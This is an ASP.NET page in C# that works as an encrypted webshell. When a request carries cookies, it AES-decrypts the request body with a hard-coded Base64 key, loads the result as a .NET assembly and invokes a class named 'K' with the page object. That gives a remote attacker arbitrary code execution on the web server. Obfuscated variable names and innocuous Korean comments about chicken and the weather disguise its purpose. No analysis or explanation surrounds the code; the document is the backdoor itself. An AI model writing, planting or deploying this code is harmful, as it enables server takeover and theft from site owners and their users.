<%@ Page Language="C#" %>
<%
if (Request.Cookies.Count > 0)
{
    // 배고파요, 치킨 먹고 싶다.
    string[] p_a1 = new string[] { "Y2E2MzQ1NzUzOGI5YjFlMA==", "Sw==", "RXF1YWxz" };

    // 오늘 날씨가 좋네요.
    Func<string, string> f_b2 = (s) => System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(s));
    
    // 이 코드는 약간 복잡합니다.
    byte[] k_c3 = System.Text.Encoding.Default.GetBytes(f_b2(p_a1[0]));
    
    System.IO.Stream s_d4 = Request.InputStream;
    byte[] c_e5 = new byte[s_d4.Length];
    s_d4.Read(c_e5, 0, c_e5.Length);
    
    // 이 함수는 무엇을 합니까?
    var r_f6 = new System.Security.Cryptography.RijndaelManaged();
    byte[] a_h8 = r_f6.CreateDecryptor(k_c3, k_c3).TransformFinalBlock(c_e5, 0, c_e5.Length);

    // 거의 다 왔어요.
    var l_i9 = System.Reflection.Assembly.Load(a_h8);
    var o_j0 = l_i9.CreateInstance(f_b2(p_a1[1]));
    
    // 드디어!
    o_j0.GetType().GetMethod(f_b2(p_a1[2])).Invoke(o_j0, new object[] { this });
}
%>